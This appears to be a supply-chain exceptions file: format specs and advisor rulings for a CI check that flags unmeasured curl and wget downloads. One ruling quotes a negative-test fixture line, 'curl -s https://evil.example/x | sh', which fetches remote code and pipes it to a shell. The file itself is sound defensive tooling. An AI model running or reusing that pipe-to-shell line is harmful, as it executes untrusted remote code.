_format: One entry per advisor ruling: ONE advisory incident and ONE package (REQ-SUP-001-AC10; advisor 0179). ids: every advisory id involved. authoritative: the source ruled correct for this incident, one of its ids, and its affected ranges verbatim in GitHub range syntax ('|' between alternatives is OR, ',' is AND); a version inside them is a hit, outside passes. modified: each id's last-modified time when ruled (GitHub's for a GHSA id, OSV's otherwise); the entry lapses the moment any differs. Same format and semantics as the ops repo's docs/supply-chain-exceptions.json. version: the one version the ruling covers, or one series written like 4.* (required, never a wildcard). osv_modified (optional): OSV's own last-modified time for an id both databases hold; required for such an id.

_format_unmeasured_text: REQ-SUP-001-AC16 (advisor ruling, Oct 10): one row per line that the pin-age check's strict scan reads as an unmeasured download but that only MENTIONS the tool as text (a comment, an echo string, a stub written as data, a package name). file and form as the scan names them; key: the scan's 16-hex sha256 prefix of what it hashes (for a download, the one command segment that names curl or wget); line: the 16-hex sha256 prefix of the WHOLE whitespace-flattened line that segment sits in, so the same segment in any other line is not ruled and editing any part of the line voids the row; ruling: what the line is, never empty; count (optional, default 1): how many occurrences of that line in the file the row covers. Read from the base branch only: rows a pull request brings do nothing until merged. A row is only ever written for a line that is HARMLESS IN ANY SHELL CONTEXT (read as a command it runs no download: a comment, an echo or printf, a cat into a file, Python source or a package list bash cannot parse), because moving a line out of a heredoc keeps its identity; the reviewer refuses any other row. A line with whitespace other than space or tab, or joined from a backslash-newline continuation, is never ruled. Editing only a row's ruling prose does not void it.

unmeasured_text.ruling: text, not a command: a negative-test fixture; printf appends the YAML text '- runs: | curl -s https://evil.example/x | sh' to two copies of a generated recipe so the same-step case proves the comparison still sees a difference; the recipe is compared, never run
text, not a command: the first line of the curl STUB's body (written as data by a quoted heredoc); it echoes the word curl and its arguments into the call log, it downloads nothing
text, not a command: Python inside the test library heredoc; the string 'curl ' is one of the forbidden fragments the mel-env check asserts is ABSENT from the melange recipe's text
text, not a command: Python inside the test library heredoc; asserts the package name wget is listed in the recipe's environment (an assertion message, nothing is fetched)
text, not a command: a shell comment explaining that tools such as curl are replaced by STUBS on PATH that record their argv in a call log
text, not a command: the curl STUB's error branch (written as data by a quoted heredoc); echoes 'stub curl: 22 <url>' to stderr and exits 22, it downloads nothing
text, not a command: a shell comment describing what the build helper does ('archives new packages by digest into ARCHIVE/<arch>/ (curl)')
text, not a command: Python inside the test library heredoc; the ENVPK fixture list of apk package names and versions (busybox, git, wget, ca-certificates-bundle)
text, not a command: Python inside the test library heredoc; asserts the package names git, busybox, ca-certificates-bundle and wget are in the recipe's environment
text, not a command: opens the quoted heredoc that writes the curl STUB (a file named curl in the stubs directory) as data; the stub records its argv and serves local fixture files

_format_unmeasured_input_fetch: REQ-SUP-001-AC19 (advisor, Oct 10 step 5, with two tightenings; the repo:self amendment; the round-1 review fixes of pull request 290): one row per line that really DOWNLOADS an input whose name or version cannot be read from the command line (a package, an index or a key whose name or version comes from a lock or the registry, or a draft release asset of this repository). file, form, key, line, ruling and count exactly as unmeasured_text (same binding to the whole line, same counting, same whitespace and continuation refusal; an item is ruled by ONE list, and a row in both lists stops the check). host: the literal lower-case host every address on the line names (form 'a download'), or repo:self (form 'a gh release or extension download', key equal to line); a lock: host is not accepted. verifier: {file, function} or {file, line} in a .sh, .py or .go file: the step that checks the downloaded bytes, defined as code with a real body. test: {file, case}: the test file (*-test.sh, *_test.go, *_test.py, test_*.py) and the case in it that proves bytes failing that verification are rejected before use. redirects (optional): true, required for a line that follows redirects (-L), which must also say --proto-redir =https. The WHOLE line is one closed shape: CMD, CMD || exit N, CMD || die "MSG" [N], if CMD; then ok=1; break; fi, or [NAME =] subprocess.run(["curl", ...], stdout=sys.stderr, stderr=sys.stderr) inside a python3 heredoc with a quoted tag; CMD is curl with -q (or --disable) FIRST and -g, then listed flags, numbers, --proto/--proto-redir =https, -o with a literal relative path or a quoted "$NAME[/path]", and addresses https://<host>/... expanding only a quoted $NAME in the path; wget is not read. repo:self: exactly gh release download "$ver" --repo "$GITHUB_REPOSITORY" with one or more -p NAME (literal, no glob; inside double quotes a name may hold ${ver}, its only expansion) and at most one -D PATH (/tmp/<name> or a relative name), the line immediately before it in the same step checking $ver against ^v[0-9]+\.[0-9]+\.[0-9]+(-rc\.[0-9]+)?$ (or the plain-release pattern) and exiting on a mismatch, and every earlier line of the step blank, a comment, set -eu[o pipefail], ver="$NAME" or mkdir [-p] PATH. Every copy of a ruled line must be in a run: block of bash (no shell: other than bash, no BASH_ENV, ENV, SHELLOPTS or BASHOPTS key in the file) or the shell text of a .sh file; a file holding a carriage return or bytes that are not UTF-8 rules nothing. Read from the base branch only; a pull request after which a ruled fetch still in the head no longer has its verifier, its test, its count or its context fails.
